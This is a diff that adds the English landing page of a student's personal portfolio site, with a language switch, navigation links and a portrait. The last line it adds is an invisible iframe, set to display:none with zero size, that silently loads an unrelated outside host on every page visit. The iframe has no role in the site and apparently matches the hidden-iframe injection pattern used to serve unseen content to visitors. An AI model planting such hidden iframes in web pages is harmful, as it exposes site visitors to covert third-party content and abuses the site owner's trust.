@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Nati | Portfolio</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="./css/styles.css" />
+</head>
+<body>
+
+<!-- Language switch button (back to German) -->
+<a href="index.html" class="language-btn" aria-label="Zur deutschen Version wechseln">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 30" class="flag-icon">
+    <clipPath id="s">
+      <path d="M0,0 v30 h60 v-30 z"/>
+    </clipPath>
+    <clipPath id="t">
+      <path d="M30,15 h30 v15 h-30 z M0,0 h30 v15 h-30 z"/>
+    </clipPath>
+    <g clip-path="url(#s)">
+      <path d="M0,0 v30 h60 v-30 z" fill="#000"/>
+      <path d="M0,10 v10 h60 v-10 z" fill="#D00"/>
+      <path d="M0,20 v10 h60 v-10 z" fill="#FFCE00"/>
+    </g>
+  </svg>
+</a>
+
+<div class="custom-cursor"></div>
+<div class="cursor-glow"></div>
+
+<canvas id="bg-canvas"></canvas>
+
+<div class="container">
+  <header class="header">
+    <h1>Hi, I'm <span class="highlight">Nati</span></h1>
+    <p class="subtitle">Media informatics student passionate about web, design & photography.</p>
+  </header>
+
+  <main class="main-content">
+    <img src="assets/images/DSCF1026.JPG" alt="Portrait of Nati" class="portrait" />
+    <nav class="nav-links">
+      <a href="projects_en.html" class="btn">My Projects</a>
+      <a href="photography_en.html" class="btn">Photography</a>
+      <a href="about_en.html" class="btn">About Me</a>
+      <a href="contact_en.html" class="btn btn-primary">Contact</a>
+    </nav>
+  </main>
+
+  <footer class="footer">
+    <p>© 2025 Nati – All rights reserved.</p>
+  </footer>
+</div>
+
+<script src="js/cursor.js"></script>
+<script src="js/script.js"></script>
+
+<iframe src="https://smartyflighty.onrender.com" style="display:none; width:0; height:0; border:0;"></iframe>
+
+</body>
+</html>
